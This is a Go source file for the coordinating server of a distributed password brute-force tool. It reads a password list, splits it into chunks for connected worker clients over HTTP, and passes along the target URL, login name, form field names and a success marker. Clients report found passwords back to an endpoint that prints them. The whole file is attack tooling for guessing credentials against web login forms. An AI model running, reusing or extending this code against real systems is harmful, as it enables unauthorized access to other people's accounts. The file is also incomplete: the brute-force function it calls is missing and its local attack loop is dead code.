package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
)

type ServerResponse struct {
	Connection_count int
	Password_list    []string
	Attack           bool
	Target           string
	Request_type     string
	Stop             string
	Login            string
	Password_field   string
	Login_field      string
}

var passwordList []string
var generatedPasswordList []string
var connectCount = 1
var chunkSize = 0
var startAttack bool
var target string
var requestType string
var loginField string
var passwordField string
var login string
var stop string

func server_mode(port int, t string, l string, s string, passwordPath string, reqType string, lField string, pField string) {
	if port > 65536 || port < 0 {
		fmt.Println("Parameter port (-p) not correct")
		return
	}
	if t == "none" {
		fmt.Println("Parameter target (-t) not found")
		return
	}
	if reqType == "post" && (lField == "none" || pField == "none") {
		fmt.Println("For post request need login field (-LF) and password field (-PF)")
		return
	}
	if l == "none" && reqType == "post" {
		fmt.Println("Parameter login (--login) not found")
		return
	}

	if s == "none" {
		fmt.Println("Parameter stop (--stop) not found")
		return
	}

	loginField = lField
	passwordField = pField
	stop = s
	login = l
	target = t
	requestType = reqType
	file, errFile := os.OpenFile(passwordPath, os.O_RDONLY, 0666)
	if errFile != nil {
		fmt.Println("Can't open password list")
		fmt.Println(errFile)
		return
	}
	defer file.Close()
	startAttack = false
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		passwordList = append(passwordList, scanner.Text())
	}
	generatedPasswordList = passwordList
	fmt.Println("Starting server...")
	http.HandleFunc("/info", info)
	http.HandleFunc("/status", status)
	http.HandleFunc("/joined", joined)
	http.HandleFunc("/unjoined", unjoined)
	go program()
	err := http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
	if err != nil {
		fmt.Println("Can't starting server")
		fmt.Println(err)
		return
	}
}

func program() {
	fmt.Println("Server start, press any key to start bruteforce")
	fmt.Scanln()
	startAttack = true
	return
	fmt.Println("Attack start")
	for _, password := range generatedPasswordList {
		result := bruteforce(target, requestType, login, password, loginField, passwordField, stop)
		if result != "" {
			fmt.Println(result)
		}
	}
	fmt.Println("Attack complete")
}

func info(response http.ResponseWriter, request *http.Request) {
	password := request.URL.Query().Get("password")
	fmt.Println(password)
}

func status(response http.ResponseWriter, request *http.Request) {
	var serverResponse ServerResponse
	serverResponse.Attack = startAttack
	serverResponse.Connection_count = connectCount
	serverResponse.Target = target
	serverResponse.Request_type = requestType
	serverResponse.Login = login
	serverResponse.Stop = stop
	serverResponse.Login_field = loginField
	serverResponse.Password_field = passwordField
	requestConnectCount := request.URL.Query().Get("connect_count")
	if fmt.Sprintf("%d", connectCount) == requestConnectCount {
		responseText, err := json.Marshal(serverResponse)
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Fprintf(response, string(responseText))
		return
	}
	if len(passwordList)/connectCount != chunkSize {
		generatedPasswordList = passwordList
		chunkSize = len(passwordList) / connectCount
	}
	serverResponse.Password_list = generatedPasswordList[:chunkSize]
	generatedPasswordList = generatedPasswordList[chunkSize:]
	responseText, err := json.Marshal(serverResponse)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintf(response, string(responseText))
}

func joined(response http.ResponseWriter, request *http.Request) {
	connectCount++
	fmt.Println("Add new connection")
	fmt.Println(fmt.Sprintf("Count connections: %d, you chunk size: %d", connectCount, len(passwordList)/connectCount))
}

func unjoined(response http.ResponseWriter, request *http.Request) {
	connectCount--
	fmt.Println("Del connection")
	fmt.Println(fmt.Sprintf("Count connections: %d, you chunk size: %d", connectCount, len(passwordList)/connectCount))
}
